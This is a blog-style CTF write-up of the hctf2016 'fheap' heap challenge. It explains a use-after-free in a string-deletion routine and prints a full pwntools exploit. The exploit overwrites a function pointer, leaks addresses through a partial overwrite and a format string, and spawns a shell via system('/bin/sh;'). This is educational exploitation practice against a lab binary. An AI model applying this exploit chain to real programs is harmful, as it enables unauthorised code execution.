After a few months, updating again (laughing emoji).

I revisited the content related to `heap` a few days ago, as I had forgotten everything I had learned months ago.

This time, I found a challenge on `ctf-wiki`.

[SRC](https://github.com/zh-explorer/hctf2016-fheap)

I compiled it myself, so the addresses will be different from its exploit.

# Function Analysis

The challenge implements `create` and `delete` functionalities.

![main](https://cdn.ova.moe/img/image-20220712215253762.png)

In the `createStr()` function, it handles strings of different sizes differently.

When `nbytesa` (which is `strlen(str)`) > `0xf`, it will `malloc` another address to store the `str` separately, and then store this address in `ptr`; otherwise, it will directly store in `ptr`.

![createStr](https://cdn.ova.moe/img/image-20220712215359688.png)

In the `deleteStr()` function, it can be observed that it only clears `*(&Strings + 4 * Int)` and does not clear `*(&Strings + 2 * Int + 1)`, which is the data of `ptr`. This provides us with the possibility of using `Double Free` and `UAF`, and the check is based on `ptr`.

![deleteStr](https://cdn.ova.moe/img/image-20220712215645194.png)

# Approach

The approach is relatively clear: allocate two strings smaller than `0xf`, `free` them, so both chunks are put in the `fastbin`. Then allocate a `0x20` size string again, `ptr` will retrieve one chunk from the `fastbin` (let's call it `0`), and the string will retrieve the other one (let's call it `1`).

At this point, we can overwrite `ptr + 3` in `1`, which is the original location of the `freeShort` function. If we then `delete(1)` at this moment, it will execute our malicious address.

# Exploit

```python
from typing import Literal, Optional, AnyStr
from pwn import *

context.log_level = 'DEBUG'
context.arch = 'amd64'
context.os = 'linux'

sh = process(['./pwn'])


def menu(index: Literal[1, 2, 3]):
    sh.recvuntil(b"3.quit")
    if index == 1:
        sh.sendline(b"create string")
        return
    if index == 2:
        sh.sendline(b"delete string")
        return
    if index == 3:
        sh.sendline(b"quit string")


def create(length_: int, content: AnyStr):
    menu(1)
    sh.sendlineafter(b"Pls give string size:", str(length_).encode())
    content = content if isinstance(content, bytes) else str(content).encode()
    content = content.ljust(length_, b'\x00')
    sh.sendlineafter(b"str:", content)


def delete(index: int, extra: Optional[AnyStr] = b''):
    menu(2)
    sh.sendlineafter(b"id:", str(index).encode())
    if isinstance(extra, str):
        extra = extra.encode()
    sh.sendlineafter(b"Are you sure?:", b"yes" + extra)


def quit_():
    menu(3)


def gdb_(time_: Optional[int] = None, arg: Optional[str] = None):
    gdb.attach(sh, arg)
    pause(time_)

```

First, set up the basic menu functions.

Following our approach, let's try to overwrite the following:

```python
create(4, b'aa')  # 0
create(4, b'aa')  # 1
delete(1)
delete(0)
gdb_(1)
create(0x20, b'a'*0x10 + b'b'*0x08 + p64(0xdeadbeef))
```

![image-20220712220738138](https://cdn.ova.moe/img/image-20220712220738138.png)

As seen, our `freeShort` function has been successfully overwritten. Now, when executing `delete(1)`, it will execute the function at `0x00005571deadbeef` and use `ptr` itself as the parameter.

However, it's important to note that due to almost all protections being enabled, we currently cannot leak `libc_base`.

![checksec](https://cdn.ova.moe/img/image-20220712221051887.png)

By observing in `IDA`, it can be noticed that right after the two `free` calls, there is a `call _puts`. Considering the characteristic of `ASLR` not randomizing the lower 12 bits, by directly changing the last two bytes to `\x7c`, we can make the `free` operation execute `puts(ptr)`. Based on the information in the image, the result of `puts` should be `'a'*0x10+'b'*0x10+addr_of_call__puts`, then subtract `0x147C` to determine the base address of the program.

![IDA](https://cdn.ova.moe/img/image-20220712221215701.png)

```python
create(4, b'aa')  # 0
create(4, b'aa')  # 1
delete(1)
delete(0)
create(0x20, b'a'*0x10 + b'b'*0x08 + b'\x7C' + b'\x00')
gdb_(1, 'b deleteStr')
delete(1)  # -> call _puts
```

The `puts(ptr)` is successfully executed, and the program's base address is calculated.

![image-20220712221653582](https://cdn.ova.moe/img/image-20220712221653582.png)

How do we leak `libc_base`? At this point, since we can execute at any address and the first parameter is controllable, we can use a *format string vulnerability* to output the address of a specific function and then find the `libc_base`.

I chose to use `printf` at `0x150E`. Note that I set `eax` to zero before executing `printf` to prevent a `test al, al` instruction at `printf+7` from not jumping if `al` is not zero, which would lead to an alignment issue with `movaps` at `printf+34`. The alignment cannot be fully controlled by us.

> One might try to realign the memory and then use `DynELF` to achieve alignment, but I saw in their write-up that they didn't succeed in reproducing it. Repeated `create` did not realign the memory.

![image-20220712221905504](https://cdn.ova.moe/img/image-20220712221905504.png)

According to the stack layout, we can identify `0x7ffe3a3d1758` as the position of `printf+153`. We can use `fmtarg 0x7ffe3a3d1758` to calculate the offset (or calculate with `6+12-1` otherwise).

```sh
pwndbg> fmtarg 0x7ffe3a3d1758
The index of format argument : 18 ("\%17$p")
```

This way, we determine the address of `printf+153`.

![image-20220712222931911](https://cdn.ova.moe/img/image-20220712222931911.png)

Next steps involve using the `libc-database` to determine the `libc` version and calculate `libc_base`, `system_addr`, and craft `/bin/sh;`.

> It's worth noting that `/bin/sh;` is constructed instead of `/bin/sh\x00` as `system()` may execute more than just `/bin/sh` preventing truncation.

Full exploit:

```python
from typing import Literal, Optional, AnyStr
from pwn import *

context.log_level = 'DEBUG'
context.arch = 'amd64'
context.os = 'linux'

sh = process(['./pwn'])


def menu(index: Literal[1, 2, 3]):
    sh.recvuntil(b"3.quit")
    if index == 1:
        sh.sendline(b"create string")
        return
    if index == 2:
        sh.sendline(b"delete string")
        return
    if index == 3:
        sh.sendline(b"quit string")


def create(length_: int, content: AnyStr):
    menu(1)
    sh.sendlineafter(b"Pls give string size:", str(length_).encode())
    content = content if isinstance(content, bytes) else str(content).encode()
    content = content.ljust(length_, b'\x00')
    sh.sendlineafter(b"str:", content)


def delete(index: int, extra: Optional[AnyStr] = b''):
    menu(2)
    sh.sendlineafter(b"id:", str(index).encode())
    if isinstance(extra, str):
        extra = extra.encode()
    sh.sendlineafter(b"Are you sure?:", b"yes" + extra)


def quit_():
    menu(3)


def gdb_(time_: Optional[int] = None, arg: Optional[str] = None):
    gdb.attach(sh, arg)
    pause(time_)

create(4, b'aa')  # 0
create(4, b'aa')  # 1
delete(1)
delete(0)
create(0x20, b'a'*0x10 + b'b'*0x08 + b'\x7C' + b'\x00')
delete(1)  # -> call _puts
sh.recvuntil(b"b"*0x08)
proc_base = u64(sh.recvline()[:-1].ljust(8, b'\x00')) - 0x147C
print(hex(proc_base))
printf = proc_base + 0x150E
delete(0)

create(0x20, b'Nova%17$pNoir' + b'b'*(0x18-len(b'Nova%17$pNoir')) + p64(printf))
delete(1)
sh.recvuntil(b"Nova")

printf_addr = sh.recvuntil(b"Noir", drop=True)
printf_addr = int(printf_addr, 16) - 153
libc_base = printf_addr - 0x55810
system_addr = libc_base + 0x453a0
print(">>>", hex(printf_addr))
sh.sendline(b"")
sh.sendline(b"")

delete(0)
create(0x20, b'/bin/sh;' + b'b'*(0x18-len(b'/bin/sh;')) + p64(system_addr))
delete(1)
sh.interactive()
```

# Summary

This was a more comprehensive challenge involving `UAF`, which took around six to seven hours. I went through the `DynELF` documentation, spent a lot of time on `movaps`, but in the end, I solved it using a more conventional approach. Finally, we got it, cheers for that!
